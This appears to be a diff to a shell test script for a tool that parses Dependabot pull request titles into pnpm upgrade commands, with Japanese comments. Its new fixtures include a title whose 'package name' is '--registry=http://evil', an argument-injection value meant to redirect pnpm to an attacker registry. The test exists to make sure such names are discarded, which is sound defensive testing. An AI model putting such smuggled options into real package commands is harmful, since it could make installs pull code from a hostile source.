@@ -89,6 +89,27 @@ assert_field "semver: pre-release from"       "$SEMVER_JSON" '.[6].semver' 'unkn
 assert_field "semver: no version"    "$SEMVER_JSON" '.[7].semver' 'unknown'
 assert_field "semver: trailing path" "$SEMVER_JSON" '.[8].semver' 'patch'
 
+# ---- toVersion: SKILL.md step 7 が pnpm up に渡す値 (issue #330) ----
+# regex が検証した部分文字列そのものを出力に載せる契約。agent が生 title から
+# 転記すると検証した文字列と使う文字列が別物になるため。
+assert_field "toVersion: 3-part"            "$SEMVER_JSON" '.[0].toVersion' '2.0.0'
+assert_field "toVersion: 2-part"            "$SEMVER_JSON" '.[3].toVersion' '1.1'
+assert_field "toVersion: v prefix を剥がす" "$SEMVER_JSON" '.[4].toVersion' '4.2.0'
+assert_field "toVersion: 末尾 in /path は入らない" "$SEMVER_JSON" '.[8].toVersion' '1.0.1'
+assert_field "toVersion: semver unknown なら空" "$SEMVER_JSON" '.[7].toVersion' ''
+
+# ---- option 形の package 名は個別維持に倒す (issue #330) ----
+# `pnpm up "--registry=http://evil@1.0.1"` は shell 再スキャンを経なくても
+# pnpm にオプションとして解釈されうるため、統合対象に残さない。
+OPTLIKE_JSON='[
+  {"number":1,"title":"Bump --registry=http://evil from 1.0.0 to 1.0.1","headRefName":"dependabot/npm_and_yarn/x","url":"u","body":"","labels":[]},
+  {"number":2,"title":"Bump -g from 1.0.0 to 1.0.1","headRefName":"dependabot/npm_and_yarn/x","url":"u","body":"","labels":[]}
+]'
+assert_field "option-like package: semver を unknown に倒す" "$OPTLIKE_JSON" '.[0].semver' 'unknown'
+assert_field "option-like package: package を空にする"       "$OPTLIKE_JSON" '.[0].package' ''
+assert_field "option-like package: toVersion も空にする"     "$OPTLIKE_JSON" '.[0].toVersion' ''
+assert_field "option-like package: 単一ハイフン形も同じ"     "$OPTLIKE_JSON" '.[1].semver' 'unknown'
+
 # ---- commit-message prefix 付き title (issue #266) ----
 # dependabot.yml の commit-message.prefix / include: scope で title 冒頭に
 # 'Chore(deps): ' 等が付くと、以前は全件 semver=unknown / package="" に落ちた
